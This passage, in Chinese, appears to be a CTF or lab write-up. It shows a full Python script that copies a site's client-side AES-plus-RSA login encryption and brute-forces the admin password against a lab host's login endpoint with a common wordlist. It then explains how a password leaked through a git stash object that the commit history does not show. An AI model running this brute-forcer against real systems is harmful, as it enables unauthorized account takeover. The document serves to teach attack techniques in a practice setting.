但是login.js把前端的加密方式都给了（前端生成随机的 AES-128-CBC 密钥和 IV，加密账号密码，然后再用 RSA 公钥 加密这个 AES 密钥和 IV。），就能构造/api/login.php的请求，那就爆破，用户名直接curl dashboard.html能看到是admin（虽然是大写的，一开始用Admin还没爆出来）

```python
import json
import base64
import os
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
from Crypto.Util.Padding import pad

# 配置信息
TARGET_URL = "http://192.168.32.22/api/login.php"
USERNAME = "admin"
PASSWORD_FILE = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt"

raw_pub_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt6l3k43vuI+8ODHhr07q
/fBswyWqv5d0SsoX2+i5rWy98PW58HNrKveU6IDRhWFOmA8MQ0j7zUcH33VGaQNO

QwIDAQAB
-----END PUBLIC KEY-----"""

def encrypt_payload(username, password):
    rsa_key = RSA.import_key(raw_pub_key.strip())
    
    # 1. 生成随机 AES Key 和 IV
    aes_key = os.urandom(16)
    iv = os.urandom(16)
    
    # 2. AES 加密 credentials
    creds = json.dumps({"username": username, "password": password}).encode()
    cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
    ct_bytes = cipher_aes.encrypt(pad(creds, 16))
    encrypted_data = base64.b64encode(ct_bytes).decode()
    
    # 3. RSA 加密 AES Key 和 IV 的 Base64 形式
    aes_key_b64 = base64.b64encode(aes_key)
    iv_b64 = base64.b64encode(iv)
    
    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    enc_key = base64.b64encode(cipher_rsa.encrypt(aes_key_b64)).decode()
    enc_iv = base64.b64encode(cipher_rsa.encrypt(iv_b64)).decode()
    
    return {
        "encryptedData": encrypted_data,
        "encryptedKey": enc_key,
        "encryptedIv": enc_iv
    }

def brute_force():
    if not os.path.exists(PASSWORD_FILE):
        print(f"[-] Error: {PASSWORD_FILE} not found!")
        return

    print(f"[*] Starting brute force for user: {USERNAME}")
    
    with open(PASSWORD_FILE, 'r') as f:
        for password in f:
            password = password.strip()
            if not password:
                continue
            
            # 生成加密负载
            payload = encrypt_payload(USERNAME, password)
            
            try:
                # 发送 POST 请求
                response = requests.post(
                    TARGET_URL, 
                    json=payload, 
                    headers={'Content-Type': 'application/json'}
                )
                
                # 检查结果
                result = response.json()
                if result.get('success'):
                    print(f"\n[+] Success! Password found: {password}")
                    print(f"[+] Token: {result.get('token')}")
                    return
                else:
                    print(f"[-] Attempt: {password} -> Failed", end='\r')
                    
            except Exception as e:
                print(f"\n[!] Error during request: {e}")
                continue

    print("\n[-] Brute force finished. No password found.")

if __name__ == "__main__":
    brute_force()
```

这里我们来看看作者是用什么方式隐藏的

首先作者提交了初始版本 81dfc8e，也就是我们能在历史记录里看到的那个，密码已经是占位符了

接着作者把密码手动改回了明文，之后使用 `git stash` “看似”把密码复原到了初始的占位符状态，实际上 `git stash` 它会保存当时工作区和暂存区的内容，所以敏感信息一样会被记录下来。

那为什么简单查看提交历史找不到呢，因为 stash 不在普通分支提交链上。stash 相当于一个临时草稿，比如项目进行一些临时的修改，如果修改完后不想提交成正式版本，就可以用 stash 把修改先“收起来”，这样项目既是之前干净的状态，也把修改保存下来了。比较特殊的地方在于这个保存实际上并不是缓存，而是真实地创建了一个git对象，而 stash 的两个父提交，一个指的是81dfc8e（工作区修改，未 add 的改动）；一个指的是75d20af（index 修改，已经 add 的改动）
